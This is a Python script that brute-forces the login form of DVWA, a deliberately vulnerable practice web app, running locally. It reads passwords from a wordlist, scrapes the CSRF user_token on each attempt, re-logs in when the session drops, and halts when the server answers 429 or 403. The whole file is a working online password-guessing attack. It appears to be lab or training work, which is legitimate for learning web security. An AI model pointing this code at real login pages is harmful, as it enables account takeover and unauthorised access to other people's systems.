import time
import threading
import re
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

def extract_user_token(html: str) -> str:
    m = re.search(r'user_token[^>]+value=["\']([^"\']+)', html, re.I)
    return m.group(1) if m else ""

def is_success_response(html):
    html = html.lower()
    return ("incorrect" not in html 
            and "wrong" not in html 
            and "invalid" not in html 
            and "failed" not in html
            and "try again" not in html
            and "error" not in html)

def login_to_dvwa(login_url, username, password, timeout=10):
    """Authenticates to the specified login_url"""
    session = requests.Session()
    r = session.get(login_url, timeout=timeout)
    token = extract_user_token(r.text)
    payload = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token
    }
    r2 = session.post(login_url, data=payload, timeout=timeout, allow_redirects=True)
    text = r2.text or ""
    if ("Logout" in text) or ("logout" in text) or ("protected area" in text) or ("login.php" not in r2.url):
        return session
    raise RuntimeError("Login failed (login_to_dvwa) — check credentials / server.")

class DVWABruteForcer:
    def __init__(self, session_or_login, brute_url, username, passwords,
                 timeout=10, delay_ms=200, concurrency=1):
        self._provided = session_or_login
        self._session = session_or_login if isinstance(session_or_login, requests.Session) else None
        self._login_func = None if isinstance(session_or_login, requests.Session) else session_or_login
        self.brute_url = brute_url.rstrip('/')
        self.brute_submit = self.brute_url
        self.username = username
        self.passwords = passwords
        self.timeout = timeout
        self.delay = delay_ms / 1000.0
        self.concurrency = max(1, concurrency)

        self.found = None
        self.attempts = 0
        self._stop = False
        self._session_lock = threading.Lock()

    def stop(self):
        self._stop = True

    def _is_logged_in(self, html):
       return "Logout" in html or "logout.php" in html or "Welcome" in html

    def _ensure_session(self):
        if not self._session:
            if not self._login_func:
                return False
            self._session = self._login_func()
            time.sleep(0.1)

        try:
            r = self._session.get(self.brute_url, timeout=self.timeout, allow_redirects=True)
            html = r.text

            if not self._is_logged_in(html):
                if not self._login_func:
                    return False

                self._session = self._login_func()
                r2 = self._session.get(self.brute_url, timeout=self.timeout)
                if not self._is_logged_in(r2.text):
                    return False
        except Exception:
            return False

        if r.url and ("login.php" in r.url or "/login" in r.url):
            if not self._login_func:
                return False
            self._session = self._login_func()
            try:
                r2 = self._session.get(self.brute_url, timeout=self.timeout)
                html = r2.text
            except Exception:
                return False
        else:
            html = r.text

        token = extract_user_token(html)
        if not token:
            if self._login_func:
                self._session = self._login_func()
                try:
                    r3 = self._session.get(self.brute_url, timeout=self.timeout)
                    html = r3.text
                    token = extract_user_token(html)
                except Exception:
                    return False
            else:
                return False

        return True

    def _attempt_single(self, password):
        if self._stop:
            return False

        ok_page = self._ensure_session()
        if not ok_page:
            return False

        try:
            r_page = self._session.get(self.brute_url, timeout=self.timeout)
            token = extract_user_token(r_page.text)
        except:
            token = ""

        params = {
            "username": self.username,
            "password": password,
            "user_token": token,
            "Login": "Login"
        }

        try:
            r = self._session.get(self.brute_url, params=params, timeout=self.timeout)
        except:
            self.attempts += 1
            return False

        self.attempts += 1

        sec_reason = r.headers.get("X-Security-Reason", "")

        if r.status_code in (429, 403):
            print(f"{password}' - BLOCKED ({r.status_code}) reason={sec_reason}")
            return "BLOCKED"
        
        ok = is_success_response(r.text)

        print(f"{password}' - {'успешно' if ok else 'ошибка'} (status {r.status_code})")

        if ok:
            return True

        return False

    def run(self):
        self._stop = False
        self.found = None

        with ThreadPoolExecutor(max_workers=self.concurrency) as ex:
            for pw in self.passwords:
                if self._stop:
                    break

                pw = pw.strip()
                if not pw:
                    continue

                fut = ex.submit(self._attempt_single, pw)

                try:
                    result = fut.result()
                except:
                    result = False

                if result is True:
                    self.found = pw
                    self._stop = True
                    ex.shutdown(wait=False, cancel_futures=True)
                    return self.found

                if result == "BLOCKED":
                    print("\n Перебор остановлен. Защита сервера активирована\n")
                    self._stop = True
                    ex.shutdown(wait=False, cancel_futures=True)
                    return None

                time.sleep(self.delay)

        return self.found

def load_wordlist(path):
    if not os.path.exists(path):
        print(f"Список не найден: {path}")
        return []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def make_login_func(login_url, username, password):
    def _f():
        print(f"{login_url}")
        return login_to_dvwa(login_url, username, password)
    return _f

DVWA_BASE = "http://localhost:8080"
DVWA_LOGIN = f"{DVWA_BASE}/login.php"
DVWA_BRUTE = f"{DVWA_BASE}/vulnerabilities/brute/"

USERNAME = "admin"
PASSWORD = "password"
WORDLIST = "words.txt"
TIMEOUT = 10
DELAY_MS = 200
THREADS = 1

def main():
    print("Brute Force")
    
    passwords = load_wordlist(WORDLIST)
    if not passwords:
        print("Список пуст или не найден")
        sys.exit(1)

    login_factory = make_login_func(DVWA_LOGIN, USERNAME, PASSWORD)

    bf = DVWABruteForcer(
        login_factory,
        DVWA_BRUTE,
        USERNAME,
        passwords,
        timeout=TIMEOUT,
        delay_ms=DELAY_MS,
        concurrency=THREADS
    )

    try:
        found = bf.run()
    except KeyboardInterrupt:
        bf.stop()
        found = bf.found

    if found:
        print(f"\nПароль найден: '{found}'\n")
    else:
        print("\nПароль не найден\n")

if __name__ == "__main__":
    main()